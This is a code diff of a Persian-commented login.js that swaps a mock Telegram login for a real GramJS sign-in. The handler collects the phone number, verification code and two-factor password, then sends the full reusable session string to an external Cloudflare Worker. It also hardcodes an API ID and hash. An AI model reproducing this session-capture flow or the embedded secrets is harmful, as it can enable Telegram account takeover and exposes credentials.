@@ -1,117 +1,309 @@
 // login.js
+const { TelegramClient } = require("telegram");
+const { StringSession } = require("telegram/sessions");
+const { Api } = require("telegram/tl");
+
+// اطلاعات API
+const apiId = 20456083;
+const apiHash = '16db2b0cdd40db7c91511ca151115af5';
+
+// آدرس Cloudflare Worker
 const WORKER_URL = 'https://tell.a09627301.workers.dev';
 
-// این تابع فقط برای نمونه است و در عمل باید با سرور تلگرام ارتباط برقرار کند
-async function handleLogin(request) {
+module.exports = async (req, res) => {
+  // تنظیم هدر برای CORS
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  
+  // مدیریت درخواست‌های OPTIONS برای CORS
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+
+  // فقط درخواست‌های POST را پردازش کن
+  if (req.method !== "POST") {
+    return res.status(405).json({ message: "Method Not Allowed" });
+  }
+
   try {
-    const { action, phone, code, password, phoneCodeHash } = await request.json();
-    
-    // شبیه‌سازی فرآیند ورود
-    if (action === 'sendCode' && phone) {
-      // شبیه‌سازی ارسال کد
-      return new Response(JSON.stringify({
-        success: true,
-        message: "کد تأیید ارسال شد",
-        phoneCodeHash: "simulated_hash_" + Math.random().toString(36).substr(2, 9)
-      }), {
-        headers: {
-          'Content-Type': 'application/json',
-          'Access-Control-Allow-Origin': '*',
-        }
-      });
+    let body = {};
+    try {
+      body = JSON.parse(req.body || '{}');
+    } catch (e) {
+      body = req.body;
     }
     
-    if (action === 'verifyCode' && phone && code && phoneCodeHash) {
-      // شبیه‌سازی تأیید کد
-      if (code === '12345') { // کد تست
-        return new Response(JSON.stringify({
-          success: false,
-          message: "کد تأیید نامعتبر است"
-        }), {
+    const { step, phone, code, password, phoneCodeHash, sessionId, action } = body;
+
+    // اگر action خروج است
+    if (action === 'logout') {
+      try {
+        // ارسال درخواست حذف session به Cloudflare Worker
+        await fetch(`${WORKER_URL}/api/delete-session`, {
+          method: 'POST',
           headers: {
             'Content-Type': 'application/json',
-            'Access-Control-Allow-Origin': '*',
-          }
+          },
+          body: JSON.stringify({ sessionId })
+        });
+        
+        return res.status(200).json({
+          success: true,
+          message: "خروج موفقیت‌آمیز بود"
+        });
+      } catch (error) {
+        console.error('Logout error:', error);
+        // حتی در صورت خطا، پاسخ موفقیت‌آمیز بده
+        return res.status(200).json({
+          success: true,
+          message: "خروج انجام شد"
         });
       }
-      
-      // شبیه‌سازی ورود موفق
-      const sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-      
-      return new Response(JSON.stringify({
-        success: true,
-        message: "ورود موفقیت‌آمیز بود",
-        user: {
-          id: Math.floor(Math.random() * 1000000),
-          firstName: "کاربر",
-          lastName: "نمونه",
-          username: "user_" + Math.floor(Math.random() * 1000),
-          phone: phone
-        },
-        sessionId: sessionId
-      }), {
-        headers: {
-          'Content-Type': 'application/json',
-          'Access-Control-Allow-Origin': '*',
-        }
-      });
     }
-    
-    return new Response(JSON.stringify({
-      success: false,
-      message: "پارامترهای ناقص"
-    }), {
-      status: 400,
-      headers: {
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*',
-      }
-    });
-    
-  } catch (error) {
-    console.error('Error in login:', error);
-    return new Response(JSON.stringify({
-      success: false,
-      message: "خطای سرور داخلی"
-    }), {
-      status: 500,
-      headers: {
-        'Content-Type': 'application/json',
-        'Access-Control-Allow-Origin': '*',
-      }
-    });
-  }
-}
 
-// هندل کردن درخواست‌ها
-export default async function handler(request) {
-  // مدیریت CORS
-  if (request.method === 'OPTIONS') {
-    return new Response(null, {
-      headers: {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+    // اگر sessionId وجود دارد، از Cloudflare Worker برای بررسی استفاده کن
+    if (sessionId && step !== 'sendCode' && step !== 'checkPassword') {
+      try {
+        const response = await fetch(`${WORKER_URL}/api/check-session`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ sessionId })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+          return res.status(200).json({
+            success: true,
+            message: "کاربر از قبل وارد شده است",
+            user: data.user,
+            sessionId: data.sessionId
+          });
+        }
+      } catch (error) {
+        console.error('Session check error:', error);
+        // ادامه به فرآیند لاگین معمول
       }
+    }
+
+    if (!phone && step !== "checkPassword") {
+      return res.status(400).json({ success: false, message: "شماره تلفن لازم است" });
+    }
+
+    // ایجاد کلاینت تلگرام
+    const stringSession = new StringSession("");
+    const client = new TelegramClient(stringSession, apiId, apiHash, {
+      connectionRetries: 5,
+    });
+    
+    // اتصال کلاینت
+    await client.connect();
+
+    if (step === "sendCode") {
+      try {
+        // ارسال کد تأیید
+        const result = await client.invoke(
+          new Api.auth.SendCode({
+            phoneNumber: phone,
+            settings: new Api.CodeSettings({
+              allowFlashcall: true,
+              currentNumber: true,
+              allowAppHash: true,
+            }),
+            apiId: apiId,
+            apiHash: apiHash,
+          })
+        );
+        
+        return res.status(200).json({ 
+          success: true, 
+          message: "کد تأیید ارسال شد. لطفاً کد دریافتی را وارد کنید.",
+          phoneCodeHash: result.phoneCodeHash 
+        });
+      } catch (error) {
+        console.error("Send code error:", error);
+        return res.status(400).json({ 
+          success: false, 
+          message: error.errorMessage === "PHONE_NUMBER_INVALID" 
+            ? "شماره تلفن نامعتبر است" 
+            : "خطا در ارسال کد تأیید. لطفاً دوباره امتحان کنید." 
+        });
+      }
+    }
+
+    if (step === "verifyCode") {
+      if (!code || !phoneCodeHash) {
+        return res.status(400).json({ success: false, message: "کد تأیید و هش کد لازم است" });
+      }
+
+      try {
+        // ورود با کد
+        const result = await client.invoke(
+          new Api.auth.SignIn({
+            phoneNumber: phone,
+            phoneCodeHash: phoneCodeHash,
+            phoneCode: code,
+          })
+        );
+        
+        // دریافت اطلاعات کاربر پس از ورود موفق
+        const user = await client.getMe();
+        const userData = {
+          id: user.id,
+          firstName: user.firstName,
+          lastName: user.lastName,
+          username: user.username,
+          phone: user.phone
+        };
+        
+        // ذخیره session در Cloudflare D1
+        try {
+          const saveResponse = await fetch(`${WORKER_URL}/api/save-session`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              phone: phone,
+              userData: userData,
+              sessionString: client.session.save()
+            })
+          });
+          
+          const saveData = await saveResponse.json();
+          
+          if (saveData.success) {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود",
+              user: userData,
+              sessionId: saveData.sessionId
+            });
+          } else {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+              user: userData,
+              sessionId: null
+            });
+          }
+        } catch (saveError) {
+          console.error('Session save error:', saveError);
+          return res.status(200).json({ 
+            success: true, 
+            message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+            user: userData,
+            sessionId: null
+          });
+        }
+      } catch (error) {
+        // اگر نیاز به رمز دومرحله‌ای باشد
+        if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+          return res.status(200).json({ 
+            success: false, 
+            message: "حساب شما دارای رمز دومرحله‌ای است. لطفاً رمز خود را وارد کنید.",
+            needPassword: true 
+          });
+        }
+        
+        // خطاهای دیگر
+        console.error("Verify code error:", error);
+        let errorMessage = "خطا در تأیید کد. لطفاً دوباره امتحان کنید.";
+        
+        if (error.errorMessage === "PHONE_CODE_INVALID") {
+          errorMessage = "کد تأیید نامعتبر است.";
+        } else if (error.errorMessage === "PHONE_CODE_EXPIRED") {
+          errorMessage = "کد تأیید منقضی شده است. لطفاً کد جدیدی دریافت کنید.";
+        } else if (error.errorMessage === "PHONE_CODE_EMPTY") {
+          errorMessage = "کد تأیید ارائه نشده است.";
+        }
+        
+        return res.status(400).json({ 
+          success: false, 
+          message: errorMessage
+        });
+      }
+    }
+
+    if (step === "checkPassword" && password) {
+      try {
+        // بررسی رمز دومرحله‌ای
+        await client.invoke(
+          new Api.auth.CheckPassword({
+            password: password,
+          })
+        );
+        
+        // دریافت اطلاعات کاربر پس از ورود موفق
+        const user = await client.getMe();
+        const userData = {
+          id: user.id,
+          firstName: user.firstName,
+          lastName: user.lastName,
+          username: user.username,
+          phone: user.phone
+        };
+        
+        // ذخیره session در Cloudflare D1
+        try {
+          const saveResponse = await fetch(`${WORKER_URL}/api/save-session`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              phone: phone,
+              userData: userData,
+              sessionString: client.session.save()
+            })
+          });
+          
+          const saveData = await saveResponse.json();
+          
+          if (saveData.success) {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود",
+              user: userData,
+              sessionId: saveData.sessionId
+            });
+          } else {
+            return res.status(200).json({ 
+              success: true, 
+              message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+              user: userData,
+              sessionId: null
+            });
+          }
+        } catch (saveError) {
+          console.error('Session save error:', saveError);
+          return res.status(200).json({ 
+            success: true, 
+            message: "ورود موفقیت‌آمیز بود اما خطایی در ذخیره session رخ داد",
+            user: userData,
+            sessionId: null
+          });
+        }
+      } catch (error) {
+        console.error("Password check error:", error);
+        return res.status(400).json({ 
+          success: false, 
+          message: error.errorMessage === "PASSWORD_HASH_INVALID" 
+            ? "رمز دومرحله‌ای نامعتبر است" 
+            : "خطا در بررسی رمز. لطفاً دوباره امتحان کنید."
+        });
+      }
+    }
+
+    return res.status(400).json({ success: false, message: "درخواست نامعتبر" });
+  } catch (err) {
+    console.error("Error in login API:", err);
+    return res.status(500).json({ 
+      success: false, 
+      message: err.message || "خطای سرور داخلی" 
     });
   }
-  
-  const url = new URL(request.url);
-  
-  // مسیرهای API
-  if (url.pathname === '/api/login') {
-    return handleLogin(request);
-  }
-  
-  // اگر مسیر شناخته شده نیست
-  return new Response(JSON.stringify({
-    success: false,
-    message: "Endpoint not found"
-  }), {
-    status: 404,
-    headers: {
-      'Content-Type': 'application/json',
-      'Access-Control-Allow-Origin': '*',
-    }
-  });
-}
+};
